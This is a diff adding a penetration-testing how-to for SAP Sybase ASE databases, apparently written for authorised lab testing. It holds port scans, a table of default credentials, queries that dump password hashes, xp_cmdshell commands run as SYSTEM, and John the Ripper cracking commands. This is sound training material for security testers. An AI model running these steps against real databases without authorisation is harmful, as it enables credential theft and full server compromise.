@@ -1,0 +1,558 @@
+*****  SYBASE DATABASE PENETRATION TESTING (HOW TO) *****  
+
+============================================================================================================
+INDEX
+============================================================================================================
+01. Reminder (definitions)
+02. SYBASE Database Penetration Testing - List of attacks
+03. How to perform a network ports scan to locate a SYABSE database
+04. How to perform a brute-force attack to identify valid database credentials (logins & passwords)
+05. How to check if a database is prone to known and unpatched vulnerabilities (e.g. obsolete database version, missing security patches)
+06. How to log into a SYBASE database using valid credentials
+07. How to review the security configuration of a SYABSE database and perform privilege escalation attacks
+08. How to dump and crack SYABSE password hashes
+
+
+============================================================================================================
+01. REMINDER - definitions
+============================================================================================================
+• RDBMS
+SYBASE database is a Relational Database Management System. It is owned by SAP.
+A relational database refers to a database that stores data in a structured format, using rows and columns. 
+
+• SCHEMA
+A schema is a collection of logical structures of data, or schema objects. 
+A schema is owned by a database user and has the same name as that user. 
+Each user owns a single schema. Schema objects can be created and manipulated with SQL.
+
+• TABLES
+Tables are the basic unit of data storage in a SYBASE database. Data is stored in rows and columns. 
+
+• VIEWS
+Views are virtual tables formed by a query. A view is a dictionary object that you can use until you drop it. 
+Views are not updatable.
+
+• TRANSACT-SQL
+Transact-SQL (T-SQL) is Microsoft's and Sybase's proprietary extension to the SQL (Structured Query Language) used to interact with relational databases.
+T-SQL expands on the SQL standard to include procedural programming, local variables, various support functions for string processing, date processing, mathematics, etc. 
+Transact-SQL is central to using Microsoft SQL Server.
+All applications that communicate with an instance of SQL Server do so by sending Transact-SQL statements to the server, regardless of the user interface of the application.
+
+• TRANSACTIONS
+A transaction is a unit of work that is performed against a database. 
+Transactions are units or sequences of work accomplished in a logical order, whether in a manual fashion by a user or automatically by some sort of a database program.
+
+• STORED PROCEDURE
+A stored procedure is a set of Structured Query Language (SQL) statements with an assigned name, which are stored in a relational database management system as a group,
+so it can be reused and shared by multiple programs.
+
+• DATABASE
+A database is the set of files where application data (the reason for a database) and meta data is stored. 
+
+• INSTANCE
+An instance is the software (and memory) that MS SQL uses to manipulate the data in the database. In order for the instance to be able to manipulate that data, the instance must open the database. A database can be opened (or mounted) by more than one instance, however, an instance can open at most one database. 
+
+• PUBLIC ROLE
+The public role is contained in every database, which includes system databases. It cannot be dropped and you cannot add or remove users from it. 
+Permissions granted to the public role are inherited by all other users and roles because they belong to the public role by default.
+Grant public only the permissions you want all users to have.
+
+• SYSADMIN PRIVILEGES
+The sysadmin fixed server role encompasses all other roles and has unlimited scope.
+
+• Several types of accounts can be used to login to a SYBASE database / SAP ASE depending of its configuration: 
+  + local database user authentication
+  + Kerberos user authentication
+  + LDAP user authentication
+  + PAM user authentication 
+
+• In order to log into a SYABSE database you need the following information:
+  + IP address
+  + Port (default port: 2638 or 5000)
+  + Instance
+  + Account's login and password
+  
+
+============================================================================================================
+02. SYBASE Database Penetration Testing - List of attacks
+============================================================================================================
+
+Black-box penetration test (FROM unauthenticated attacker TO authenticated database user)
+------------------------------------------------------------------------------------------------------------
+• Password brute-force attack to identify default or trivial database credentials (e.g., local database accounts)
+• Kerberoasting attack to recover Windows credentials used to run SYBASE database instances
+• SQL injection in a Web application that allow you to run unauthorized SQL queries to a SYBASE database
+• You have compromised a server and you found clear-text database credentials hardcoded in configuration files (web.config),  scripts, log files or application source code. 
+• Man-In-The-Middle attack to eavesdropp clear-text or hashed database credentials (e.g. ARP cache poisoning, LLMNR/NBTNS poisonning)
+• Run a remote exploit (0-day or missing patches).
+• To complete…
+
+
+============================================================================================================
+03. How to perform a network port scan to locate a SYBASE Database
+============================================================================================================
+
+Defaults ports
+---------------
+2638		tcp,udp		Sybase database / Sybase SQL Anywhere  (OLD)
+5000		tcp			  SAP Sybase ASE (Adaptive Server Enterprise)
+8282, 8283 	tcp 	SCC - SAP Control Center (https://IP:8283/scc/)
+
+
+1. NMAP port scanner (basic example)
+--------------------------------------
+
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap -sS -sC -vv -Pn -p 1-65535 192.168.1.128           
+[sudo] password for kali: 
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-20 16:36 EDT
+<SNIP>
+Initiating SYN Stealth Scan at 16:36
+Scanning 192.168.1.128 [65535 ports]
+<SNIP>
+
+Reason: 65501 resets
+PORT      STATE SERVICE        REASON
+80/tcp    open  http           syn-ack ttl 128
+135/tcp   open  msrpc          syn-ack ttl 128
+139/tcp   open  netbios-ssn    syn-ack ttl 128
+443/tcp   open  https          syn-ack ttl 128
+445/tcp   open  microsoft-ds   syn-ack ttl 128
+593/tcp   open  http-rpc-epmap syn-ack ttl 128
+<SNIP>
+5000/tcp  open  upnp           syn-ack ttl 128
+<SNIP>
+8283/tcp  open  unknown        syn-ack ttl 128
+| ssl-cert: Subject: commonName=srvwin2k16.security-test-lab.local/organizationName=sybase, inc./stateOrProvinceName=ca/countryName=us/localityName=dublin/organizationalUnitName=unified agent framework
+| Issuer: commonName=srvwin2k16.security-test-lab.local/organizationName=sybase, inc./stateOrProvinceName=ca/countryName=us/localityName=dublin/organizationalUnitName=unified agent framework
+| Public Key type: rsa
+| Public Key bits: 1024
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2022-03-20T02:21:34
+| Not valid after:  2032-03-19T02:21:33
+| MD5:   0fdf cf24 31f1 6675 6969 4dc5 80f4 f891
+| SHA-1: c3c3 c9d3 1366 98f6 079b a05f 1bdc 3316 b34c bbc7
+| -----BEGIN CERTIFICATE-----
+| MIICmzCCAgSgAwIBAgIEEMdKODANBgkqhkiG9w0BAQUFADCBkTELMAkGA1UEBhMC
+| dXMxCzAJBgNVBAgTAmNhMQ8wDQYDVQQHEwZkdWJsaW4xFTATBgNVBAoTDHN5YmFz
+| ZSwgaW5jLjEgMB4GA1UECxMXdW5pZmllZCBhZ2VudCBmcmFtZXdvcmsxKzApBgNV
+| BAMTInNydndpbjJrMTYuc2VjdXJpdHktdGVzdC1sYWIubG9jYWwwHhcNMjIwMzIw
+| MDIyMTM0WhcNMzIwMzE5MDIyMTMzWjCBkTELMAkGA1UEBhMCdXMxCzAJBgNVBAgT
+| AmNhMQ8wDQYDVQQHEwZkdWJsaW4xFTATBgNVBAoTDHN5YmFzZSwgaW5jLjEgMB4G
+| A1UECxMXdW5pZmllZCBhZ2VudCBmcmFtZXdvcmsxKzApBgNVBAMTInNydndpbjJr
+| MTYuc2VjdXJpdHktdGVzdC1sYWIubG9jYWwwgZ8wDQYJKoZIhvcNAQEBBQADgY0A
+| MIGJAoGBAKegpignMc1qSsPQ60t2cof4H4V2oCgp0i/kWWpqqIhRuvWbX8evfoca
+| pDU99sL4mzmiSpeyW9sGvtYm9Fpy6kKi+LumMOlnTEBO3JMz+loFy0hWFTrC6cTM
+| K193cZeoXPY4t9rgr1g9pX5360VMrTgLFXgtiADrjOMz8THUH9AnAgMBAAEwDQYJ
+| KoZIhvcNAQEFBQADgYEALuBTr+C2xTeBP8vO4XrTzWJmCioPC8d5OeU1AiT9eXBY
+| ioaTWOh6vtWG+Bgnh9XRdwPA48Pb+vUp2MX+0nolxCk/bxhoWy73V2ySIFhASziO
+| ozir/N/J8KmWlndgEApGcCIU0eBqN1Eiv2EyVJ/xeUzJpXV7uNqx9o4UaXpQy38=
+|_-----END CERTIFICATE-----
+|_ssl-date: 2022-03-20T19:39:46+00:00; -1h00m39s from scanner time.
+9998/tcp  open  distinct32     syn-ack ttl 128
+|_uptime-agent-info: The script encountered an error: Error getting system info
+
+<SNIP>
+Nmap done: 1 IP address (1 host up) scanned in 279.61 seconds
+           Raw packets sent: 67641 (2.976MB) | Rcvd: 66599 (2.664MB)
+
+
+2. Powershell command "Test-NetConnection" (basic example)
+-----------------------------------------------------------
+
+PS C:\Users\Administrator.PO718687> Test-NetConnection 192.168.1.128 -port 5000
+ComputerName     : 192.168.1.128
+RemoteAddress    : 192.168.1.128
+RemotePort       : 5000
+InterfaceAlias   : WiFi
+SourceAddress    : 192.168.1.35
+TcpTestSucceeded : True
+
+PS C:\Users\Administrator.PO718687> Test-NetConnection 192.168.1.128 -port 8283                                                                                                                                                                                                                                                                                         ComputerName     : 192.168.1.128
+RemoteAddress    : 192.168.1.128
+RemotePort       : 8283
+InterfaceAlias   : WiFi
+SourceAddress    : 192.168.1.35
+TcpTestSucceeded : True
+
+PS C:\Users\Administrator.PO718687> Test-NetConnection 192.168.1.128 -port 2638
+WARNING: TCP connect to (192.168.1.128 : 2638) failed
+ComputerName           : 192.168.1.128
+RemoteAddress          : 192.168.1.128
+RemotePort             : 2638
+InterfaceAlias         : WiFi
+SourceAddress          : 192.168.1.35
+PingSucceeded          : True
+PingReplyDetails (RTT) : 0 ms
+TcpTestSucceeded       : False
+
+
+============================================================================================================
+04. How to perform a brute-force attack to identify valid database credentials (logins & passwords)
+============================================================================================================
+
+• All the classic password brute-force tools (e.g. patator, hydra, medusa, msf modules) don't have a module for Sybase databases.
+
+• List of "old" default credentials:
+
+Database	User ID			Password		Access
+===========================================
+Sybase		sa				  (none)			Admin
+Sybase		sa				  sasasa			Admin
+Sybase		probe			  (none)			Admin
+Sybase		mon_user		(none)			Admin
+Sybase		mon_user		mon_user		Admin
+Sybase		DBA				  SQL				  Admin
+Sybase		entldbreader	rdrpswd			Admin
+
+
+=========================================================================================================================================
+05. How to check if a database is prone to known and unpatched vulnerabilities (e.g. obsolete database version, missing security patches)
+=========================================================================================================================================
+
+Step 1. Identify the database version (e.g. version disclosed in software banner, service fingerprinting) using various tools such as Nmap or Metasploit discovery modules.
+        Obviously if you already have credentials it is better to use them and to log into the database to check its exact version and its patching level.
+
+Step 2. Search on the Internet (e.g. database provider website, www.cvedetails.com) if the version is still supported and not prone to known vulnerabilities.
+
+Step 3. Look for known exploit using various tools and sources such as ExploitDB / SearchSploit, Metasploit, Github, ...
+
+Useful link: https://www.cvedetails.com/vulnerability-list/vendor_id-430/Sybase.html
+
+
+============================================================================================================
+06. How to log into a SYBASE database using valid credentials
+============================================================================================================
+
+1. isql - Interactive SQL utility of Sybase
+===========================================
+• The the isql utility is a command line tool which allows the user to execute SQL in batch or interactively. 
+  It has some interesting options such as an option to generate output wrapped in an HTML table.
+
+   isql –S <servername> –U <username> -P <password>   
+   use <dbname> go
+   
+
+2. DbVisualizer (Database client sofwtare - Free and Pro version available)
+===========================================================================
+
+Product: DbVisualizer Free 10.0.23 [Build #3008]
+
+Database settings
+------------------
+Database type: SAP (Sybase) ASE
+Driver (JDBC): SAP (Sybase) ASE (jTDS)
+Database server: 192.168.1.128
+Database Port: 5000
+
+Authentication settings
+------------------------
+Database Userid: sa
+Database Password: **********
+
+Connection Message
+------------------
+ASE
+15.70
+jTDS Type 4 JDBC Driver for MS SQL Server and Sybase
+1.3.1
+
+
+=======================================================================================================================================
+07. How to review the security configuration of a SYABSE database and perform privilege escalation attacks
+=======================================================================================================================================
+
+
+07.1. Review the security configuration of a SYABSE database (i.e. list of users, DB password policy, who is DBA...) 
+=====================================================================================================================
+
+• Useful links
+ - http://www.vulnerabilityassessment.co.uk/sybase.htm
+ - https://help.sap.com/viewer/2705a3b1e3df4514ab089cfedf87750d/16.0.3.2/en-US/a9101e19bc2b1014988a9b72458be9c5.html
+
+
+• Display the database version
+================================
+SQL> select @@version
+
+ Adaptive Server Enterprise/15.7/EBF 21339 SMP SP101 /P/X64/Windows Server/ase157sp101/3439/64-bit/OPT/Thu Jun 06 12:11:05 2013
+
+
+• Display Sybase ASE Server configuration settings
+===================================================
+SQL> exec sp_configure
+ 
+Parameter Name						Default	Memory Used	Config Value		Run Value	Unit	Type
+------------------------------------------------------------------------------------------------------------
+enable concurrent dump tran	          	0	          0	           0	           0	switch	dynamic
+enable functionality group	          	0	          0	           0	           0	switch	dynamic
+enable inline default sharing	        0	          0	           0	           0	switch	dynamic
+enable permissive unicode	          	0	          0	           0	           0	switch	dynamic
+enable plan sharing	          			0	          0	           0	           0	switch	dynamic
+quoted identifier enhancements	        0	          0	           0	           0	switch	static
+select for update	          			0	          0	           0	           0	switch	dynamic
+streamlined dynamic SQL	          		0	          0	           0	           0	switch	dynamic
+suppress js max task message	        0	          0	           0	           0	switch	dynamic
+
+
+• Check if 'Remote Server Access' is allowed by the Sybase DB server (by default this is set to 1 and allowed)
+===============================================================================================================
+SQL> exec master..sp_configure 'allow remote access'
+
+Parameter Name				Default	Memory Used		Config Value  Run 			Value	Unit			Type
+-------------------------------------------------------------------------------------------------------------
+allow remote access           	          1	          0	           1	           1	switch          dynamic       
+
+
+• List the databases present on the target DB server
+====================================================
+SQL> exec sp_helpdb
+
+name				db_size		owner	dbid	created			durability	lobcomplvl	inrowlen	status
+------------------------------------------------------------------------------------------------------------
+master	      		26.0 MB		sa	    1		Mar 20, 2022	full	         0	    NULL		mixed log and data
+model	       		6.0 MB		sa	    3		Mar 20, 2022	full	         0	    NULL		mixed log and data
+pubs2	       		7.0 MB		sa	    4		Mar 20, 2022	full	         0	    NULL		trunc log on chkpt, mixed log and data
+pubs3	       		6.0 MB		sa	    5		Mar 20, 2022	full	         0	    NULL		trunc log on chkpt, mixed log and data
+sybsystemdb	      	12.0 MB		sa	31513		Mar 20, 2022	full	         0	    NULL		trunc log on chkpt, mixed log and data
+sybsystemprocs	    172.0 MB	sa	31514		Mar 20, 2022	full	         0	    NULL		trunc log on chkpt, mixed log and data
+tempdb	    	 	106.0 MB	sa	    2		Mar 20, 2022	no_recovery	     0	    NULL		select into/bulkcopy/pllsort, trunc log on chkpt, mixed log and data, allow wide dol rows
+
+
+• List what other servers the tested Sybase server is able to execute 'Remote Procedure Calls' on
+==================================================================================================
+SQL> exec sp_helpserver
+
+name				network_name	security_mechanism	server_principal	class	status	id	cost
+----------------------------------------------------------------------------------------------------
+SRVWIN2K161			SRVWIN2K161		(null)				(null)				local		 0	   0
+SRVWIN2K161_XP		SRVWIN2K161_XP	(null)				(null)				RPCServer	no timeouts, no net password encryption, writable , enable login redirection	 3	1000
+SYB_BACKUP			SRVWIN2K161_BS	(null)				(null)				ASEnterprise	timeouts, no net password encryption, writable , enable login redirection	 1	NULL
+SYB_EJB				EJBServer		(null)				(null)				ASEJB	external engine auto start, enable login redirection	 2	NULL
+
+
+• Enumerating groups on a db server and who is a member of which group
+=======================================================================
+SQL> use <DB_Name>
+SQL> exec sp_helpgroup
+
+SQL> use <DB_Name>
+SQL> exec sp_helpgroup <Group_Name>
+
+
+• Checking the local DB password policy
+========================================
+To display the database password policy settings (e.g., minimum password length, password hashing/encryption method, password expiration date), 
+it has to been done for each user.
+
+SQL> sp_displaylogin <account_name>
+SQL> sp_displaylogin sa
+
+	OK
+	SQLWarning: 
+		1) Suid: 1
+		2) Loginame: sa
+		3) Fullname:
+		4) Default Database: master
+		5) Default Language:
+		6) Auto Login Script:
+		7) Configured Authorization:
+		8) sa_role (default ON)
+		9) sso_role (default ON)
+		10) oper_role (default ON)
+		11) sybase_ts_role (default ON)
+		12) mon_role (default ON)
+		13) sa_serverprivs_role (default ON)
+		14) Locked: NO
+		15) Date of Last Password Change: Mar 20 2022 12:06PM
+		16) Password expiration interval: 0
+		17) Password expired: NO
+		18) Minimum password length: 6
+		19) Maximum failed logins: 0
+		20) Current failed login attempts:
+		21) Authenticate with: AUTH_DEFAULT
+		22) Login Password Encryption: SHA-256
+		23) Last login date: Mar 20 2022  1:15PM
+		24) Exempt inactive lock: 0
+
+
+SQL> exec sp_configure "minimum password length"
+
+Parameter Name							Default		Memory Used		Config Value	Run Value		Unit		Type
+------------------------------------------------------------------------------------------------------------------------
+minimum password length       	          6	          	0	           6	           6			bytes       dynamic     
+
+
+• Dump the password hashes for the local db accounts (needs DBA rights)
+========================================================================
+SQL> select * from master..syslogins
+OR
+SQL> select name, password from master..syslogins
+
+	name,		password
+	'sa',		0xc0073c08e7a27a3991f0e19f0dd97671db12e84feb4cc142852918c2c6e687de439a267731bad3e87510
+	'probe',	0xc007497a105831763d2f6f84ce75a257a3a47d2f9fef58d26f09c75c8096aaec658fcfb88e0d180829f0
+	<snip>
+
+
+• Enumerating roles present on the server and obtaining information about the roles of a particular user
+==========================================================================================================
+SQL> select name, password, pwdate, status from syssrvroles
+
+name				pwdate	status
+-----------------------------------
+sa_role				(null)	(null)
+sso_role			(null)	(null)
+oper_role			(null)	(null)
+sybase_ts_role		(null)	(null)
+navigator_role		(null)	(null)
+replication_role	(null)	(null)
+dtm_tm_role			(null)	(null)
+ha_role				(null)	(null)
+mon_role			(null)	(null)
+js_admin_role		(null)	(null)
+messaging_role		(null)	(null)
+js_client_role		(null)	(null)
+js_user_role		(null)	(null)
+webservices_role	(null)	(null)
+keycustodian_role	(null)	(null)
+sa_serverprivs_role	(null)	(null)
+
+
+SQL> exec sp_displayroles <account_name>, expand_down
+SQL> exec sp_displayroles sa, expand_down
+
+Role Name	Parent Role Name	Level
+-------------------------------------
+sa_role				(null)		1
+mon_role			(null)		1
+sso_role			(null)		1
+oper_role			(null)		1
+sybase_ts_role		(null)		1
+sa_serverprivs_role	(null)		1
+
+
+• Check to see if auditing has been set on the system
+======================================================
+SQL> exec sp_configure auditing
+
+Parameter Name	Default		Memory Used		Config Value	Run Value	Unit		Type
+-------------------------------------------------------------------------------------------
+auditing         	0	          0	           0	           0		switch      dynamic             
+
+
+SQL> exec sp_configure 'log audit logon failure';
+
+Parameter Name							Default		Memory Used	Config Value	Run Value	Unit		Type
+-------------------------------------------------------------------------------------------------------------
+log audit logon failure       	          0	          	0	           0	           0	switch      dynamic             
+
+
+Other - Useful commands
+=========================
+
+Task						Required role				Command or procedure		Database, group, or role
+---------------------------------------------------------------------------------------------------------------
+Create login accounts  		System security officer		create login				Master database
+
+Alter login accounts		System security officer		alter login					Master database
+							The exception is that 
+							users can change their 
+							own password and full name.
+
+Add users to database		Database owner or 			sp_adduser					User database
+and assign groups			System administrator
+
+Grant groups, users, 		Database owner, 			grant						User database
+or roles permission to		system administrator, 	
+create or access 			system security officer, 
+database objects and		or object owner
+run commands
+      
+	  
+	  
+7.2. DB Privesc - TO DO ...
+=======================================================================================================================================
+> TO DO
+
+
+7.3. OS Privesc - From SYSDBA to a low (or high) privileged OS user using the extended stored procedure "XP_CMDSHELL"
+=======================================================================================================================
+• Run unathorized remote OS commands as the SQL Server service account using the extended stored procedure xp_cmdshell.
+  By default, only a system administrator can execute xp_cmdshell. A system administrator can grant execute permission to other users.
+
+  xp_cmdshell context sets the security context for the operating system command to be executed using the xp_cmdshell system ESP. The values for the context determines under which account the command runs:
+  0 – command runs under XP Server’s account.
+  1 – command runs under user’s account.
+  2 – command runs under XP Server’s account only if the user has administrator privileges.
+
+
+If the Sybase database is running on a Windows server, then type the following commands (logged as a DBA)
+---------------------------------------------------------------------------------------------------------
+
+SQL> xp_cmdshell 'whoami';
+or
+SQL> exec master..xp_cmdshell 'whoami';  	
+
+    xp_cmdshell
+	-----------------------------------------------------------
+	User access denied. Not a member of NT adminsitrator group.
+	Execution time: 0.009 seconds
+
+
+SQL> sp_configure 'xp_cmdshell', 0;
+or
+SQL> exec master..sp_configure 'xp_cmdshell', 0;
+
+	Parameter Name,			Default,	Memory Used,	Config Value,		Run Value,	Unit,			Type
+	---------------------------------------------------------------------------------------------------------
+	'xp_cmdshell context',		'1',			'0',			'0',			'0',	'switch',		'dynamic'
+
+
+SQL> exec master..xp_cmdshell 'whoami';  	
+    
+	xp_cmdshell
+	-----------------------------------------------------------
+	nt authority\system
+
+
+SQL> exec master..xp_cmdshell 'hostname';  	
+    
+	xp_cmdshell
+	-----------------------------------------------------------
+	SRVWIN2K16
+	
+	
+If the Sybase database is running on a Linux server...
+SQL> exec master..xp_cmdshell 'ls';  		
+
+
+============================================================================================================
+08. How to dump and crack SYBASE password hashes
+============================================================================================================
+
+
+1. Collect the password hashes for the lcoal db accounts (needs DBA rights)
+============================================================================
+SQL> select * from master..syslogins
+OR
+SQL> select name, password from master..syslogins
+
+	name,		password
+	'sa',		0xc0073c08e7a27a3991f0e19f0dd97671db12e84feb4cc142852918c2c6e687de439a267731bad3e87510
+	'probe',	0xc007497a105831763d2f6f84ce75a257a3a47d2f9fef58d26f09c75c8096aaec658fcfb88e0d180829f0
+	<snip>
+
+
+2. Crack the password hashes using John JTR
+============================================
+
+$ cat hashes.txt
+sa:0xc0073c08e7a27a3991f0e19f0dd97671db12e84feb4cc142852918c2c6e687de439a267731bad3e87510
+probe:0xc007497a105831763d2f6f84ce75a257a3a47d2f9fef58d26f09c75c8096aaec658fcfb88e0d180829f0
+<SNIP>
+
+$ john hashes.txt
+$ john --format=sybasease --wordlist=PATH\dico.txt --rules=all hashes.txt 
+
